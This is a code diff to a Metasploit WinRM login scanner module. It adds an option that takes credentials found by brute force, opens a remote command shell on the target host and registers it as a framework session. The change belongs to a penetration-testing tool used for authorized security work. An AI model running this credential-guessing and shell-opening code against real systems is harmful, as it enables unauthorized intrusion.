+++ modules/auxiliary/scanner/winrm/winrm_login.rb
@@ -6,12 +6,13 @@
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner'
 require 'metasploit/framework/login_scanner/winrm'
+require 'net/winrm/connection'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::WinRM
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
-
+  include Msf::Auxiliary::CommandShell
   include Msf::Auxiliary::Scanner
 
   def initialize
@@ -24,7 +25,7 @@ class MetasploitModule < Msf::Auxiliary
         module without SSL, the 'AllowUnencrypted' winrm option must be set.
         Otherwise adjust the port and set the SSL options in the module as appropriate.
       },
-      'Author'         => [ 'thelightcosine' ],
+      'Author'         => [ 'thelightcosine', 'smashery' ],
       'References'     =>
         [
           [ 'CVE', '1999-0502'] # Weak password
@@ -74,6 +75,31 @@ class MetasploitModule < Msf::Auxiliary
         create_credential_login(credential_data)
 
         print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
+        if datastore['CreateSession']
+          rhost = result.host
+          rport = result.port
+          uri = datastore['URI']
+          ssl = datastore['SSL']
+          schema = ssl ? 'https' : 'http'
+          endpoint = "#{schema}://#{rhost}:#{rport}#{uri}"
+          conn = Net::MsfWinRM::RexWinRMConnection.new(
+                      endpoint: endpoint,
+                      host: rhost,
+                      port: rport,
+                      uri: uri,
+                      ssl: ssl,
+                      user: result.credential.public,
+                      password: result.credential.private,
+                      transport: :rex,
+                      :no_ssl_peer_verification => true,
+                      :operation_timeout => 1,
+                      :retry_delay => 1
+                 )
+            shell = conn.shell(:stdin)
+            # Trigger the shell to open
+            shell.send_stdin('')
+            session_setup(shell,rhost,rport,endpoint)
+        end
       else
         invalidate_login(credential_data)
         vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
@@ -82,6 +108,41 @@ class MetasploitModule < Msf::Auxiliary
 
   end
 
+def session_setup(shell,rhost,rport,endpoint)
+    sess = Msf::Sessions::WinrmCommandShell.new(shell,rhost,rport)
+    sess.platform = 'windows'
+    username = datastore['USERNAME']
+    password = datastore['PASSWORD']
+    info = "WinRM #{username}:#{password} (#{shell.owner})"
+    merge_me = {
+      'USERNAME' => username,
+      'PASSWORD' => password
+    }
+
+    start_session(self, info, merge_me,false,nil,sess)
+  end
+
+  def start_session(obj, info, ds_merge, crlf = false, sock = nil, sess = nil)
+    sess.set_from_exploit(obj)
+    sess.info = info
+
+    # Clean up the stored data
+    sess.exploit_datastore.merge!(ds_merge)
+
+    framework.sessions.register(sess)
+    sess.process_autoruns(datastore)
+
+    # Notify the framework that we have a new session opening up...
+    # Don't let errant event handlers kill our session
+    begin
+      framework.events.on_session_open(sess)
+    rescue ::Exception => e
+      wlog("Exception in on_session_open event handler: #{e.class}: #{e}")
+      wlog("Call Stack\n#{e.backtrace.join("\n")}")
+    end
+
+    sess
+  end
 
   def test_request
     return winrm_wql_msg("Select Name,Status from Win32_Service")
